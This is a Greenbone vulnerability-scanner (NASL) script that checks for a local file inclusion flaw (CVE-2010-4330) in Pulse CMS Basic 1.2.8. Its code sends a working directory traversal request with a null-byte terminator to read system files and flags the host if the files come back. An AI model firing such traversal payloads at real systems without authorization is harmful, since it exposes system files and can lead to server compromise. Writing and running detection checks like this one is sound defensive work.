# SPDX-FileCopyrightText: 2010 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:pulsecms:pulse_cms";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100935");
  script_version("2025-04-15T05:54:49+0000");
  script_cve_id("CVE-2010-4330");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2010-12-06 15:55:47 +0100 (Mon, 06 Dec 2010)");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_name("Pulse CMS Basic Local File Include Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_pulse_cms_http_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("pulsecms/http/detected");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/45186");
  script_xref(name:"URL", value:"http://www.uncompiled.com/2010/12/pulse-cms-basic-local-file-inclusion-vulnerability-cve-2010-4330/");

  script_tag(name:"solution", value:"Reportedly, the issue is fixed in version 1.2.9, but Symantec
  has not confirmed this. Please contact the vendor for more information.");

  script_tag(name:"summary", value:"Pulse CMS Basic is prone to a local file-include vulnerability.");

  script_tag(name:"impact", value:"An attacker can exploit this issue to include arbitrary local
  files and execute PHP code on the affected computer in the context of the webserver process.
  This may facilitate a compromise of the application and the underlying system, other attacks are
  also possible.");

  script_tag(name:"affected", value:"Pulse CMS Basic 1.2.8 is vulnerable. Other versions may also be
  affected.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("misc_func.inc");
include("traversal_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("os_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

files = traversal_files();

foreach file(keys(files)) {
  url = dir + "/index.php??p=" + crap(data: "../", length: 3 * 9) + files[file] + "%00";

  if (http_vuln_check(port: port, url: url, pattern: file)) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
